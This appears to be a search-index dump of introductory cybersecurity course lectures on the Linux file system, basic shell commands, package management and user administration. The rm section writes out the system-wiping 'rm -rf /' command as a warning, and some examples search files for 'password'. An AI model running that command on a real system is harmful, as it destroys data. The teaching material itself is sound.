Unlike Windows with its C:\\ drive, D:\\ drive, etc., Linux has a single directory tree that starts at the root, represented by / . Everything branches from there: / \u251c\u2500\u2500 bin/ # Essential command binaries \u251c\u2500\u2500 boot/ # Boot loader files \u251c\u2500\u2500 dev/ # Device files \u251c\u2500\u2500 etc/ # Configuration files \u251c\u2500\u2500 home/ # User home directories \u251c\u2500\u2500 lib/ # System libraries \u251c\u2500\u2500 mnt/ # Mount points for temporary file systems \u251c\u2500\u2500 opt/ # Optional software packages \u251c\u2500\u2500 proc/ # Process information \u251c\u2500\u2500 root/ # Root user home directory \u251c\u2500\u2500 sbin/ # System binaries \u251c\u2500\u2500 tmp/ # Temporary files \u251c\u2500\u2500 usr/ # User programs and data \u2514\u2500\u2500 var/ # Variable data (logs, databases) You don't need to memorize this yet, but you'll become familiar with these directories as we progress. The important thing to understand is that everything has its place, and that structure is consistent across all Linux systems. Users and Permissions Remember those protection rings we talked about? Linux implements that security model through users and permissions . There are two types of users: Regular users : Limited privileges, can't modify system files or install software system-wide. This is where you'll do most of your work for safety. Root user : The superuser with complete access to everything. Root can do anything\u2014install software, modify system files, delete critical components. Root operates in Ring 0, the kernel level. When you need to run a command with root privileges as a regular user, you use sudo (short for \"superuser do\"). This is like Windows UAC prompts, but more granular and controlled. Why This Matters for Security Understanding Linux is fundamental to cybersecurity because: - Most attack targets (servers) run Linux - Most security tools require Linux - You need to understand system administration to secure systems - Attackers use Linux tools, so you need to think like them - Defensive security requires knowing what's normal vs. abnormal in Linux environments","title":"Lesson 1.4"},{"location":"LECTURES/unit1/lesson1-4/#linux-cont","text":"","title":"Linux cont."},{"location":"LECTURES/unit1/lesson1-4/#why-linux-for-cybersecurity","text":"You might be wondering: \"Why can't I just use Windows or Mac for security work?\" You technically can, but here's why Linux is the standard: Transparency : Because the source code is open, you can see exactly what the operating system is doing. No hidden processes, no mysterious telemetry. In security, you need to know what's happening under the hood. Control : Linux gives you complete control over your system. You can customize everything, remove anything, and configure it precisely for your needs. This is essential when you're working with security tools. Command Line Power : While Windows and Mac have command lines, Linux was built around it. The terminal is where you'll do most security work\u2014running scans, analyzing logs, automating tasks, and exploiting vulnerabilities. Server Dominance : Most servers on the internet run Linux. If you want to secure web applications, cloud infrastructure, or network services, you need to know Linux. Security Tools : The vast majority of cybersecurity tools are built for Linux first. Some are exclusive to Linux. Tools like Metasploit, Wireshark, Nmap, and Burp Suite all work best on Linux. Community : The Linux community is massive and helpful. When you run into problems (and you will), there's a wealth of documentation, forums, and resources available.","title":"Why Linux for Cybersecurity?"},{"location":"LECTURES/unit1/lesson1-4/#linux-distributions-in-more-depth","text":"Here's something interesting: there isn't just one \"Linux.\" There are hundreds of distributions (or \"distros\") of Linux, each designed for different purposes. A distribution is basically Linux packaged with different software, desktop environments, and configurations. Some popular distributions: - Ubuntu : Beginner-friendly, widely used, great for learning - Debian : Stable and reliable, the foundation for many other distros - Kali Linux : Specifically designed for penetration testing and security auditing (we'll use this a lot) - Parrot Security : Another security-focused distro with a focus on privacy - Arch Linux : Minimalist, requires manual configuration, teaches you how everything works - CentOS/RHEL : Enterprise-focused, common in corporate environments For this course, we'll primarily use Kali Linux because it comes pre-installed with hundreds of security tools. But the skills you learn apply to all Linux distributions.","title":"Linux Distributions In More Depth"},{"location":"LECTURES/unit1/lesson1-4/#the-linux-philosophy","text":"Linux follows some core principles that shape how you'll interact with it: Everything is a file : In Linux, everything\u2014devices, processes, directories\u2014is treated as a file. This makes the system consistent and predictable. Small, focused tools : Instead of giant programs that do everything, Linux uses small programs that do one thing well. You combine them to accomplish complex tasks. Command-line first : The graphical interface is optional. The real power is in the terminal. User responsibility : Linux assumes you know what you're doing. It won't stop you from deleting critical system files or running dangerous commands. This freedom is powerful but requires caution.","title":"The Linux Philosophy"},{"location":"LECTURES/unit1/lesson1-4/#the-file-system-structure","text":"Unlike Windows with its C:\\ drive, D:\\ drive, etc., Linux has a single directory tree that starts at the root, represented by / . Everything branches from there: / \u251c\u2500\u2500 bin/ # Essential command binaries \u251c\u2500\u2500 boot/ # Boot loader files \u251c\u2500\u2500 dev/ # Device files \u251c\u2500\u2500 etc/ # Configuration files \u251c\u2500\u2500 home/ # User home directories \u251c\u2500\u2500 lib/ # System libraries \u251c\u2500\u2500 mnt/ # Mount points for temporary file systems \u251c\u2500\u2500 opt/ # Optional software packages \u251c\u2500\u2500 proc/ # Process information \u251c\u2500\u2500 root/ # Root user home directory \u251c\u2500\u2500 sbin/ # System binaries \u251c\u2500\u2500 tmp/ # Temporary files \u251c\u2500\u2500 usr/ # User programs and data \u2514\u2500\u2500 var/ # Variable data (logs, databases) You don't need to memorize this yet, but you'll become familiar with these directories as we progress. The important thing to understand is that everything has its place, and that structure is consistent across all Linux systems.","title":"The File System Structure"},{"location":"LECTURES/unit1/lesson1-4/#users-and-permissions","text":"Remember those protection rings we talked about? Linux implements that security model through users and permissions . There are two types of users: Regular users : Limited privileges, can't modify system files or install software system-wide. This is where you'll do most of your work for safety. Root user : The superuser with complete access to everything. Root can do anything\u2014install software, modify system files, delete critical components. Root operates in Ring 0, the kernel level. When you need to run a command with root privileges as a regular user, you use sudo (short for \"superuser do\"). This is like Windows UAC prompts, but more granular and controlled.","title":"Users and Permissions"},{"location":"LECTURES/unit1/lesson1-4/#why-this-matters-for-security","text":"Understanding Linux is fundamental to cybersecurity because: - Most attack targets (servers) run Linux - Most security tools require Linux - You need to understand system administration to secure systems - Attackers use Linux tools, so you need to think like them - Defensive security requires knowing what's normal vs. abnormal in Linux environments","title":"Why This Matters for Security"},{"location":"LECTURES/unit1/lesson1-5/","text":"Basic Linux Commands Now that you understand why Linux matters for cybersecurity, it's time to actually use it. The command line interface (CLI) is where you'll spend most of your time, so getting comfortable with basic commands is essential. The Terminal The terminal (also called shell or command line) is your interface to Linux. Unlike graphical interfaces where you click icons, here you type commands. It might feel awkward at first, but it's far more powerful and precise. When you open a terminal, you'll see a prompt that looks something like: user@hostname:~$ Breaking this down: - user : Your username - hostname : The computer's name - ~ : Current directory (~ means home directory) - $ : Regular user (if you see # , you're root) Navigation Commands pwd - Print Working Directory Shows where you currently are in the file system. pwd # Output: /home/user ls - List Directory Contents Shows files and folders in current directory. # Basic listing ls # Long format (detailed) ls -l # Show hidden files (start with .) ls -a # Combine flags ls -la # Human-readable file sizes ls -lh # Sort by modification time ls -lt cd - Change Directory Move between directories. # Go to home directory cd cd ~ # Go to specific directory cd /etc # Go up one level cd .. # Go up two levels cd ../.. # Go to previous directory cd - # Relative path (from current location) cd Documents # Absolute path (from root) cd /var/log Pro tip : Use Tab for autocomplete. Start typing a directory name and hit Tab. File Manipulation cat - Concatenate and Display Files Display file contents. cat file.txt # Display multiple files cat file1.txt file2.txt # Number lines cat -n file.txt less - View Files Page by Page Better for large files. less largefile.txt # Use arrow keys to scroll # Press 'q' to quit # Press '/' to search # Press 'n' for next search result head and tail - View File Beginnings/Ends # First 10 lines head file.txt # First 20 lines head -n 20 file.txt # Last 10 lines tail file.txt # Last 20 lines tail -n 20 file.txt # Follow file (watch new lines appear) tail -f /var/log/syslog touch - Create Empty Files touch newfile.txt # Create multiple files touch file1.txt file2.txt file3.txt # Update timestamp of existing file touch existingfile.txt mkdir - Make Directory mkdir newfolder # Create nested directories mkdir -p parent/child/grandchild # Create multiple directories mkdir dir1 dir2 dir3 cp - Copy Files/Directories # Copy file cp source.txt destination.txt # Copy to directory cp file.txt /home/user/Documents/ # Copy directory recursively cp -r sourcedir/ destdir/ # Copy with verbose output cp -v file.txt copy.txt # Preserve permissions and timestamps cp -p file.txt copy.txt mv - Move/Rename Files # Rename file mv oldname.txt newname.txt # Move file to directory mv file.txt /home/user/Documents/ # Move multiple files mv file1.txt file2.txt /home/user/Documents/ # Move directory mv olddir/ newdir/ rm - Remove Files/Directories WARNING: No recycle bin in Linux! Deleted = gone forever. # Remove file rm file.txt # Remove multiple files rm file1.txt file2.txt # Remove directory and contents rm -r directory/ # Force removal (no confirmation) rm -f file.txt # Interactive (ask before each deletion) rm -i file.txt # Remove directory (force and recursive) rm -rf directory/ NEVER run : rm -rf / or rm -rf /* - this deletes everything! Viewing and Searching grep - Search Text Find lines containing specific text. # Search for word in file grep \"password\" file.txt # Case-insensitive search grep -i \"password\" file.txt # Show line numbers grep -n \"error\" logfile.txt # Recursive search in directory grep -r \"TODO\" /home/user/code/ # Invert match (show lines NOT containing text) grep -v \"success\" logfile.txt # Count matches grep -c \"error\" logfile.txt find - Find Files and Directories # Find files by name find /home -name \"*.txt\" # Find directories find /home -type d -name \"Documents\" # Find files modified in last 7 days find /home -mtime -7 # Find files larger than 100MB find /home -size +100M # Find and delete find /tmp -name \"*.tmp\" -delete # Find with specific permissions find /home -perm 777 locate - Quick File Search Uses database, faster than find but less current. # Update database first sudo updatedb # Find files locate password.txt # Case-insensitive locate -i PASSWORD.TXT File Permissions Every file has permissions for owner, group, and others. Understanding Permissions ls -l file.txt # Output: -rw-r--r-- 1 user group 1234 Jan 1 12:00 file.txt Breaking down -rw-r--r-- : - First character: File type ( - = file, d = directory, l = link) - Next 3: Owner permissions ( rw- = read, write, no execute) - Next 3: Group permissions ( r-- = read only) - Last 3: Other permissions ( r-- = read only) Permissions in numeric form: - r (read) = 4 - w (write) = 2 - x (execute) = 1 So rwx = 4+2+1 = 7, rw- = 4+2 = 6, r-- = 4 chmod - Change Permissions # Give owner execute permission chmod u+x script.sh # Remove write permission from group chmod g-w file.txt # Set specific permissions (numeric) chmod 755 script.sh # rwxr-xr-x chmod 644 file.txt # rw-r--r-- # Recursive chmod -R 755 directory/ Common permission sets: - 777 : Everyone can do everything (usually bad idea) - 755 : Owner full access, others read/execute (typical for directories) - 644 : Owner read/write, others read (typical for files) - 600 : Owner read/write only (private files) chown - Change Owner # Change owner sudo chown newowner file.txt # Change owner and group sudo chown newowner:newgroup file.txt # Recursive sudo chown -R newowner directory/ System Information whoami - Current User whoami # Output: user hostname - Computer Name hostname # Output: kali-linux uname - System Information # Basic info uname # All information uname -a # Kernel version uname -r df - Disk Space # Show disk usage df # Human-readable df -h # Specific filesystem df -h /home du - Directory Size # Size of directory du -sh /home/user # Size of all items in directory du -h /home/user # Show total only du -s /home/user free - Memory Usage # Show memory free # Human-readable free -h top - Process Monitor Real-time view of running processes. top # Press 'q' to quit # Press 'k' to kill a process # Press 'M' to sort by memory # Press 'P' to sort by CPU Better alternative: htop (if installed) htop ps - Process Status # Current user's processes ps # All processes ps aux # Search for specific process ps aux | grep firefox Process Management Running Commands in Background # Run in background command & # Example python3 script.py & jobs - List Background Jobs jobs fg - Bring to Foreground # Bring last job to foreground fg # Bring specific job fg %1 kill - Terminate Process # Kill by PID kill 1234 # Force kill kill -9 1234 # Kill by name killall firefox Redirection and Pipes Output Redirection # Write to file (overwrite) echo \"Hello\" > file.txt # Append to file echo \"World\" >> file.txt # Redirect errors command 2> error.log # Redirect both output and errors command > output.log 2>&1 Pipes Send output of one command as input to another. # Count lines cat file.txt | wc -l # Search in output ps aux | grep python # Chain multiple commands cat file.txt | grep \"error\" | wc -l # Sort and unique cat file.txt | sort | uniq Text Processing wc - Word Count # Count lines, words, characters wc file.txt # Just lines wc -l file.txt # Just words wc -w file.txt sort - Sort Lines # Sort alphabetically sort file.txt # Sort numerically sort -n numbers.txt # Reverse sort sort -r file.txt # Sort and remove duplicates sort -u file.txt uniq - Remove Duplicates Must be sorted first! # Remove adjacent duplicates sort file.txt | uniq # Count occurrences sort file.txt | uniq -c # Show only duplicates sort file.txt | uniq -d Archives and Compression tar - Archive Files # Create archive tar -cvf archive.tar directory/ # Extract archive tar -xvf archive.tar # Create compressed archive (gzip) tar -czvf archive.tar.gz directory/ # Extract compressed archive tar -xzvf archive.tar.gz # List contents without extracting tar -tvf archive.tar Flags explained: - c : create - x : extract - v : verbose - f : file - z : gzip compression - j : bzip2 compression zip/unzip - Zip Archives # Create zip zip archive.zip file1 file2 # Create zip of directory zip -r archive.zip directory/ # Extract zip unzip archive.zip # List contents unzip -l archive.zip Network Commands ping - Test Connectivity # Ping host ping google.com # Ping 4 times only ping -c 4 google.com wget - Download Files # Download file wget https://example.com/file.txt # Download with different name wget -O newname.txt https://example.com/file.txt # Download in background wget -b https://example.com/largefile.zip curl - Transfer Data # Download file curl -O https://example.com/file.txt # Save with different name curl -o newname.txt https://example.com/file.txt # Follow redirects curl -L https://example.com # Show headers only curl -I https://example.com ifconfig / ip - Network Configuration # Show network interfaces (older) ifconfig # Show network interfaces (modern) ip addr show # Show routing table ip route show Command Tips and Tricks Command History # Show history history # Run previous command !! # Run command from history !123 # Search history Ctrl+R (then start typing) # Clear history history -c Tab Completion Press Tab once: Complete if unique Press Tab twice: Show all possibilities Keyboard Shortcuts Ctrl+C : Cancel current command Ctrl+Z : Suspend current command Ctrl+D : Exit terminal / End of input Ctrl+L : Clear screen (same as clear ) Ctrl+A : Move to beginning of line Ctrl+E : Move to end of line Ctrl+U : Delete from cursor to beginning Ctrl+K : Delete from cursor to end Getting Help # Manual pages man command # Example man ls # Quick help command --help # Example ls --help Practical Examples Find all .txt files in home directory find ~ -name \"*.txt\" Search for \"password\" in all files grep -r \"password\" /home/user/ Find largest files in directory du -ah /home/user | sort -rh | head -10 Count how many times IP appears in log grep \"192.168.1.100\" /var/log/apache2/access.log | wc -l Find all running Python processes ps aux | grep python Monitor log file in real-time tail -f /var/log/syslog Create directory structure mkdir -p project/{src,docs,tests} Next Steps Practice these commands! The only way to get comfortable is repetition. Try: 1. Navigate your file system using only terminal 2. Create, move, and delete files 3. Search for specific content in files 4. Monitor system processes 5. Combine commands with pipes In the next lesson, we'll cover more advanced Linux topics including package management, user administration, and system services. Remember: Google is your friend. If you forget a command or need to know options, search for it or use man . Every security professional regularly looks up commands\u2014it's not about memorization, it's about knowing what's possible and where to find information.","title":"Lesson 1.5"},{"location":"LECTURES/unit1/lesson1-5/#basic-linux-commands","text":"Now that you understand why Linux matters for cybersecurity, it's time to actually use it. The command line interface (CLI) is where you'll spend most of your time, so getting comfortable with basic commands is essential.","title":"Basic Linux Commands"},{"location":"LECTURES/unit1/lesson1-5/#the-terminal","text":"The terminal (also called shell or command line) is your interface to Linux. Unlike graphical interfaces where you click icons, here you type commands. It might feel awkward at first, but it's far more powerful and precise. When you open a terminal, you'll see a prompt that looks something like: user@hostname:~$ Breaking this down: - user : Your username - hostname : The computer's name - ~ : Current directory (~ means home directory) - $ : Regular user (if you see # , you're root)","title":"The Terminal"},{"location":"LECTURES/unit1/lesson1-5/#navigation-commands","text":"","title":"Navigation Commands"},{"location":"LECTURES/unit1/lesson1-5/#pwd-print-working-directory","text":"Shows where you currently are in the file system. pwd # Output: /home/user","title":"pwd - Print Working Directory"},{"location":"LECTURES/unit1/lesson1-5/#ls-list-directory-contents","text":"Shows files and folders in current directory. # Basic listing ls # Long format (detailed) ls -l # Show hidden files (start with .) ls -a # Combine flags ls -la # Human-readable file sizes ls -lh # Sort by modification time ls -lt","title":"ls - List Directory Contents"},{"location":"LECTURES/unit1/lesson1-5/#cd-change-directory","text":"Move between directories. # Go to home directory cd cd ~ # Go to specific directory cd /etc # Go up one level cd .. # Go up two levels cd ../.. # Go to previous directory cd - # Relative path (from current location) cd Documents # Absolute path (from root) cd /var/log Pro tip : Use Tab for autocomplete. Start typing a directory name and hit Tab.","title":"cd - Change Directory"},{"location":"LECTURES/unit1/lesson1-5/#file-manipulation","text":"","title":"File Manipulation"},{"location":"LECTURES/unit1/lesson1-5/#cat-concatenate-and-display-files","text":"Display file contents. cat file.txt # Display multiple files cat file1.txt file2.txt # Number lines cat -n file.txt","title":"cat - Concatenate and Display Files"},{"location":"LECTURES/unit1/lesson1-5/#less-view-files-page-by-page","text":"Better for large files. less largefile.txt # Use arrow keys to scroll # Press 'q' to quit # Press '/' to search # Press 'n' for next search result","title":"less - View Files Page by Page"},{"location":"LECTURES/unit1/lesson1-5/#head-and-tail-view-file-beginningsends","text":"# First 10 lines head file.txt # First 20 lines head -n 20 file.txt # Last 10 lines tail file.txt # Last 20 lines tail -n 20 file.txt # Follow file (watch new lines appear) tail -f /var/log/syslog","title":"head and tail - View File Beginnings/Ends"},{"location":"LECTURES/unit1/lesson1-5/#touch-create-empty-files","text":"touch newfile.txt # Create multiple files touch file1.txt file2.txt file3.txt # Update timestamp of existing file touch existingfile.txt","title":"touch - Create Empty Files"},{"location":"LECTURES/unit1/lesson1-5/#mkdir-make-directory","text":"mkdir newfolder # Create nested directories mkdir -p parent/child/grandchild # Create multiple directories mkdir dir1 dir2 dir3","title":"mkdir - Make Directory"},{"location":"LECTURES/unit1/lesson1-5/#cp-copy-filesdirectories","text":"# Copy file cp source.txt destination.txt # Copy to directory cp file.txt /home/user/Documents/ # Copy directory recursively cp -r sourcedir/ destdir/ # Copy with verbose output cp -v file.txt copy.txt # Preserve permissions and timestamps cp -p file.txt copy.txt","title":"cp - Copy Files/Directories"},{"location":"LECTURES/unit1/lesson1-5/#mv-moverename-files","text":"# Rename file mv oldname.txt newname.txt # Move file to directory mv file.txt /home/user/Documents/ # Move multiple files mv file1.txt file2.txt /home/user/Documents/ # Move directory mv olddir/ newdir/","title":"mv - Move/Rename Files"},{"location":"LECTURES/unit1/lesson1-5/#rm-remove-filesdirectories","text":"WARNING: No recycle bin in Linux! Deleted = gone forever. # Remove file rm file.txt # Remove multiple files rm file1.txt file2.txt # Remove directory and contents rm -r directory/ # Force removal (no confirmation) rm -f file.txt # Interactive (ask before each deletion) rm -i file.txt # Remove directory (force and recursive) rm -rf directory/ NEVER run : rm -rf / or rm -rf /* - this deletes everything!","title":"rm - Remove Files/Directories"},{"location":"LECTURES/unit1/lesson1-5/#viewing-and-searching","text":"","title":"Viewing and Searching"},{"location":"LECTURES/unit1/lesson1-5/#grep-search-text","text":"Find lines containing specific text. # Search for word in file grep \"password\" file.txt # Case-insensitive search grep -i \"password\" file.txt # Show line numbers grep -n \"error\" logfile.txt # Recursive search in directory grep -r \"TODO\" /home/user/code/ # Invert match (show lines NOT containing text) grep -v \"success\" logfile.txt # Count matches grep -c \"error\" logfile.txt","title":"grep - Search Text"},{"location":"LECTURES/unit1/lesson1-5/#find-find-files-and-directories","text":"# Find files by name find /home -name \"*.txt\" # Find directories find /home -type d -name \"Documents\" # Find files modified in last 7 days find /home -mtime -7 # Find files larger than 100MB find /home -size +100M # Find and delete find /tmp -name \"*.tmp\" -delete # Find with specific permissions find /home -perm 777","title":"find - Find Files and Directories"},{"location":"LECTURES/unit1/lesson1-5/#locate-quick-file-search","text":"Uses database, faster than find but less current. # Update database first sudo updatedb # Find files locate password.txt # Case-insensitive locate -i PASSWORD.TXT","title":"locate - Quick File Search"},{"location":"LECTURES/unit1/lesson1-5/#file-permissions","text":"Every file has permissions for owner, group, and others.","title":"File Permissions"},{"location":"LECTURES/unit1/lesson1-5/#understanding-permissions","text":"ls -l file.txt # Output: -rw-r--r-- 1 user group 1234 Jan 1 12:00 file.txt Breaking down -rw-r--r-- : - First character: File type ( - = file, d = directory, l = link) - Next 3: Owner permissions ( rw- = read, write, no execute) - Next 3: Group permissions ( r-- = read only) - Last 3: Other permissions ( r-- = read only) Permissions in numeric form: - r (read) = 4 - w (write) = 2 - x (execute) = 1 So rwx = 4+2+1 = 7, rw- = 4+2 = 6, r-- = 4","title":"Understanding Permissions"},{"location":"LECTURES/unit1/lesson1-5/#chmod-change-permissions","text":"# Give owner execute permission chmod u+x script.sh # Remove write permission from group chmod g-w file.txt # Set specific permissions (numeric) chmod 755 script.sh # rwxr-xr-x chmod 644 file.txt # rw-r--r-- # Recursive chmod -R 755 directory/ Common permission sets: - 777 : Everyone can do everything (usually bad idea) - 755 : Owner full access, others read/execute (typical for directories) - 644 : Owner read/write, others read (typical for files) - 600 : Owner read/write only (private files)","title":"chmod - Change Permissions"},{"location":"LECTURES/unit1/lesson1-5/#chown-change-owner","text":"# Change owner sudo chown newowner file.txt # Change owner and group sudo chown newowner:newgroup file.txt # Recursive sudo chown -R newowner directory/","title":"chown - Change Owner"},{"location":"LECTURES/unit1/lesson1-5/#system-information","text":"","title":"System Information"},{"location":"LECTURES/unit1/lesson1-5/#whoami-current-user","text":"whoami # Output: user","title":"whoami - Current User"},{"location":"LECTURES/unit1/lesson1-5/#hostname-computer-name","text":"hostname # Output: kali-linux","title":"hostname - Computer Name"},{"location":"LECTURES/unit1/lesson1-5/#uname-system-information","text":"# Basic info uname # All information uname -a # Kernel version uname -r","title":"uname - System Information"},{"location":"LECTURES/unit1/lesson1-5/#df-disk-space","text":"# Show disk usage df # Human-readable df -h # Specific filesystem df -h /home","title":"df - Disk Space"},{"location":"LECTURES/unit1/lesson1-5/#du-directory-size","text":"# Size of directory du -sh /home/user # Size of all items in directory du -h /home/user # Show total only du -s /home/user","title":"du - Directory Size"},{"location":"LECTURES/unit1/lesson1-5/#free-memory-usage","text":"# Show memory free # Human-readable free -h","title":"free - Memory Usage"},{"location":"LECTURES/unit1/lesson1-5/#top-process-monitor","text":"Real-time view of running processes. top # Press 'q' to quit # Press 'k' to kill a process # Press 'M' to sort by memory # Press 'P' to sort by CPU Better alternative: htop (if installed) htop","title":"top - Process Monitor"},{"location":"LECTURES/unit1/lesson1-5/#ps-process-status","text":"# Current user's processes ps # All processes ps aux # Search for specific process ps aux | grep firefox","title":"ps - Process Status"},{"location":"LECTURES/unit1/lesson1-5/#process-management","text":"","title":"Process Management"},{"location":"LECTURES/unit1/lesson1-5/#running-commands-in-background","text":"# Run in background command & # Example python3 script.py &","title":"Running Commands in Background"},{"location":"LECTURES/unit1/lesson1-5/#jobs-list-background-jobs","text":"jobs","title":"jobs - List Background Jobs"},{"location":"LECTURES/unit1/lesson1-5/#fg-bring-to-foreground","text":"# Bring last job to foreground fg # Bring specific job fg %1","title":"fg - Bring to Foreground"},{"location":"LECTURES/unit1/lesson1-5/#kill-terminate-process","text":"# Kill by PID kill 1234 # Force kill kill -9 1234 # Kill by name killall firefox","title":"kill - Terminate Process"},{"location":"LECTURES/unit1/lesson1-5/#redirection-and-pipes","text":"","title":"Redirection and Pipes"},{"location":"LECTURES/unit1/lesson1-5/#output-redirection","text":"# Write to file (overwrite) echo \"Hello\" > file.txt # Append to file echo \"World\" >> file.txt # Redirect errors command 2> error.log # Redirect both output and errors command > output.log 2>&1","title":"Output Redirection"},{"location":"LECTURES/unit1/lesson1-5/#pipes","text":"Send output of one command as input to another. # Count lines cat file.txt | wc -l # Search in output ps aux | grep python # Chain multiple commands cat file.txt | grep \"error\" | wc -l # Sort and unique cat file.txt | sort | uniq","title":"Pipes"},{"location":"LECTURES/unit1/lesson1-5/#text-processing","text":"","title":"Text Processing"},{"location":"LECTURES/unit1/lesson1-5/#wc-word-count","text":"# Count lines, words, characters wc file.txt # Just lines wc -l file.txt # Just words wc -w file.txt","title":"wc - Word Count"},{"location":"LECTURES/unit1/lesson1-5/#sort-sort-lines","text":"# Sort alphabetically sort file.txt # Sort numerically sort -n numbers.txt # Reverse sort sort -r file.txt # Sort and remove duplicates sort -u file.txt","title":"sort - Sort Lines"},{"location":"LECTURES/unit1/lesson1-5/#uniq-remove-duplicates","text":"Must be sorted first! # Remove adjacent duplicates sort file.txt | uniq # Count occurrences sort file.txt | uniq -c # Show only duplicates sort file.txt | uniq -d","title":"uniq - Remove Duplicates"},{"location":"LECTURES/unit1/lesson1-5/#archives-and-compression","text":"","title":"Archives and Compression"},{"location":"LECTURES/unit1/lesson1-5/#tar-archive-files","text":"# Create archive tar -cvf archive.tar directory/ # Extract archive tar -xvf archive.tar # Create compressed archive (gzip) tar -czvf archive.tar.gz directory/ # Extract compressed archive tar -xzvf archive.tar.gz # List contents without extracting tar -tvf archive.tar Flags explained: - c : create - x : extract - v : verbose - f : file - z : gzip compression - j : bzip2 compression","title":"tar - Archive Files"},{"location":"LECTURES/unit1/lesson1-5/#zipunzip-zip-archives","text":"# Create zip zip archive.zip file1 file2 # Create zip of directory zip -r archive.zip directory/ # Extract zip unzip archive.zip # List contents unzip -l archive.zip","title":"zip/unzip - Zip Archives"},{"location":"LECTURES/unit1/lesson1-5/#network-commands","text":"","title":"Network Commands"},{"location":"LECTURES/unit1/lesson1-5/#ping-test-connectivity","text":"# Ping host ping google.com # Ping 4 times only ping -c 4 google.com","title":"ping - Test Connectivity"},{"location":"LECTURES/unit1/lesson1-5/#wget-download-files","text":"# Download file wget https://example.com/file.txt # Download with different name wget -O newname.txt https://example.com/file.txt # Download in background wget -b https://example.com/largefile.zip","title":"wget - Download Files"},{"location":"LECTURES/unit1/lesson1-5/#curl-transfer-data","text":"# Download file curl -O https://example.com/file.txt # Save with different name curl -o newname.txt https://example.com/file.txt # Follow redirects curl -L https://example.com # Show headers only curl -I https://example.com","title":"curl - Transfer Data"},{"location":"LECTURES/unit1/lesson1-5/#ifconfig-ip-network-configuration","text":"# Show network interfaces (older) ifconfig # Show network interfaces (modern) ip addr show # Show routing table ip route show","title":"ifconfig / ip - Network Configuration"},{"location":"LECTURES/unit1/lesson1-5/#command-tips-and-tricks","text":"","title":"Command Tips and Tricks"},{"location":"LECTURES/unit1/lesson1-5/#command-history","text":"# Show history history # Run previous command !! # Run command from history !123 # Search history Ctrl+R (then start typing) # Clear history history -c","title":"Command History"},{"location":"LECTURES/unit1/lesson1-5/#tab-completion","text":"Press Tab once: Complete if unique Press Tab twice: Show all possibilities","title":"Tab Completion"},{"location":"LECTURES/unit1/lesson1-5/#keyboard-shortcuts","text":"Ctrl+C : Cancel current command Ctrl+Z : Suspend current command Ctrl+D : Exit terminal / End of input Ctrl+L : Clear screen (same as clear ) Ctrl+A : Move to beginning of line Ctrl+E : Move to end of line Ctrl+U : Delete from cursor to beginning Ctrl+K : Delete from cursor to end","title":"Keyboard Shortcuts"},{"location":"LECTURES/unit1/lesson1-5/#getting-help","text":"# Manual pages man command # Example man ls # Quick help command --help # Example ls --help","title":"Getting Help"},{"location":"LECTURES/unit1/lesson1-5/#practical-examples","text":"","title":"Practical Examples"},{"location":"LECTURES/unit1/lesson1-5/#find-all-txt-files-in-home-directory","text":"find ~ -name \"*.txt\"","title":"Find all .txt files in home directory"},{"location":"LECTURES/unit1/lesson1-5/#search-for-password-in-all-files","text":"grep -r \"password\" /home/user/","title":"Search for \"password\" in all files"},{"location":"LECTURES/unit1/lesson1-5/#find-largest-files-in-directory","text":"du -ah /home/user | sort -rh | head -10","title":"Find largest files in directory"},{"location":"LECTURES/unit1/lesson1-5/#count-how-many-times-ip-appears-in-log","text":"grep \"192.168.1.100\" /var/log/apache2/access.log | wc -l","title":"Count how many times IP appears in log"},{"location":"LECTURES/unit1/lesson1-5/#find-all-running-python-processes","text":"ps aux | grep python","title":"Find all running Python processes"},{"location":"LECTURES/unit1/lesson1-5/#monitor-log-file-in-real-time","text":"tail -f /var/log/syslog","title":"Monitor log file in real-time"},{"location":"LECTURES/unit1/lesson1-5/#create-directory-structure","text":"mkdir -p project/{src,docs,tests}","title":"Create directory structure"},{"location":"LECTURES/unit1/lesson1-5/#next-steps","text":"Practice these commands! The only way to get comfortable is repetition. Try: 1. Navigate your file system using only terminal 2. Create, move, and delete files 3. Search for specific content in files 4. Monitor system processes 5. Combine commands with pipes In the next lesson, we'll cover more advanced Linux topics including package management, user administration, and system services. Remember: Google is your friend. If you forget a command or need to know options, search for it or use man . Every security professional regularly looks up commands\u2014it's not about memorization, it's about knowing what's possible and where to find information.","title":"Next Steps"},{"location":"LECTURES/unit1/lesson1-6/","text":"Package Management and System Administration Linux systems need software installation, updates, and maintenance. As a security professional, you'll constantly be installing tools, updating systems, and managing services. This lesson covers the essential system administration tasks. Package Management Package managers handle software installation, updates, and removal. Different Linux distributions use different package managers. APT (Debian/Ubuntu/Kali) APT (Advanced Package Tool) is used on Debian-based systems like Ubuntu and Kali Linux. Updating Package Lists # Update package index sudo apt update # Always do this before installing new software! Upgrading Packages # Upgrade all installed packages sudo apt upgrade # Upgrade with automatic handling of dependencies sudo apt full-upgrade # Upgrade specific package sudo apt upgrade package-name Installing Packages # Install package sudo apt install nmap # Install multiple packages sudo apt install nmap wireshark metasploit-framework # Install without confirmation sudo apt install -y nmap # Reinstall package sudo apt install --reinstall nmap Removing Packages # Remove package (keep configuration files) sudo apt remove nmap # Remove package and configuration files sudo apt purge nmap # Remove unused dependencies sudo apt autoremove # Clean up downloaded package files sudo apt clean Searching for Packages # Search for package apt search nmap # Show package information apt show nmap # List installed packages apt list --installed # List upgradeable packages apt list --upgradeable YUM/DNF (Red Hat/Fedora/CentOS) Used on Red Hat-based systems. # Update package lists sudo yum update # or sudo dnf update # Install package sudo yum install nmap # Remove package sudo yum remove nmap # Search for package yum search nmap # Show package info yum info nmap Installing from Source Sometimes you need to compile software from source code. # 1. Download source code wget https://example.com/software.tar.gz # 2. Extract tar -xzvf software.tar.gz cd software/ # 3. Configure ./configure # 4. Compile make # 5. Install sudo make install # 6. Uninstall (if needed) sudo make uninstall Common compilation dependencies: sudo apt install build-essential sudo apt install gcc g++ make User Management Creating Users # Create new user sudo useradd john # Create user with home directory sudo useradd -m john # Create user with specific shell sudo useradd -m -s /bin/bash john # Set password sudo passwd john Modifying Users # Change user's shell sudo usermod -s /bin/zsh john # Add user to group sudo usermod -aG sudo john # Add to sudo group sudo usermod -aG docker john # Add to docker group # Change home directory sudo usermod -d /home/newjohn john # Lock user account sudo usermod -L john # Unlock user account sudo usermod -U john Deleting Users # Delete user (keep home directory) sudo userdel john # Delete user and home directory sudo userdel -r john User Information # Show current user whoami # Show all users cat /etc/passwd # Show logged in users who # Show what users are doing w # Last logins last # Show user's groups groups username # Show user ID and group ID id username Switching Users # Switch to another user su - john # Switch to root su - # Run command as another user sudo -u john command # Open shell as root sudo -i # Run command as root sudo command Group Management Creating Groups # Create group sudo 